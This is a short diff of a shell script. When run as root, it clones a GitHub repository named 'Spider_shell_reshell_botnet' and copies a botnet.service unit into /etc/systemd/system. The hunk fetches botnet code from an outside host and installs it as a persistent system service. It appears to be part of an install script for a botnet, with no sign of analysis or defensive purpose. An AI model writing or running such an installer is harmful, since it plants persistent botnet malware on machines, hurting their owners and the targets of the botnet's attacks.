@@ -15,7 +15,7 @@ if [[ $(id -u) -eq 0 ]]; then
 
 
     
-    	git clone [link]
+    	git clone https://github.com/Dhanraj369/Spider_shell_reshell_botnet.git
 
     	cp Debian_based_botne/Bnet/botnet.service /etc/systemd/system/
         #Debian_based_botne
